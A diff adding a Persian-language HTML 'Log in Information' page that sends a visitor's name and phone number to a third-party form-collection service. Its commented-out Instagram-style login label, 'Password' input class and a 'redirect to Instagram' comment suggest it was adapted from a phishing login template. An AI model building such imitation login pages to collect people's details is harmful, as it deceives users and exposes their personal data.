@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>Information page</title> 
+  <link rel="shortcut icon" href="./Styles/images/LOGGGG.png" type="image/x-icon">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  
+
+   <div class="page-box">
+  <!-- <h4> class="name-log">Log in Information</h4>  -->
+   <h3 class="name-log">Log in Information</h3>
+   <form class="form-log" action="https://formcarry.com/s/O9kjLYjUp5D" method="POST">
+    <!-- <label for="subject" class="lable_user" >Phone number, username, or email</label> -->
+    <input class="username" type="text" name="subject_input" id="subject" placeholder="نام" required>
+    <!-- <label for="more_information" class="label_pass" >(Coustomary)</label> -->
+    <input class="Password margin-Pass" type="text" name="information_input" id="more_information" placeholder="شماره تماس" required>
+    <button class="Login" type="submit">Log in</button>
+    
+    <div class="or">
+      <p class="p-or">OR</p> 
+    </div>
+   <br>
+     <a href="#" target="_blank" class="Face">about us</a>
+<br>
+<br>
+<br>
+    
+  </form>
+  </div>
+ 
+
+<script>
+  const form = document.querySelector("form");
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault(); // جلوگیری از رفرش یا خروج از صفحه
+    
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+      method: form.method,
+      body: formData,
+      headers: {
+        Accept: "application/json",
+      },
+    })
+    .then((response) => {
+      if (response.ok) {
+        // پاک کردن فیلدها (اختیاری)
+        form.reset();
+        // هدایت به اینستاگرام
+        window.location.href = "#";
+      } else {
+        alert("خطایی در ارسال فرم پیش آمد!");
+      }
+    })
+    .catch(() => {
+      alert("اتصال با سرور برقرار نشد.");
+    });
+  });
+</script>
+
+
+</body>
+</html>
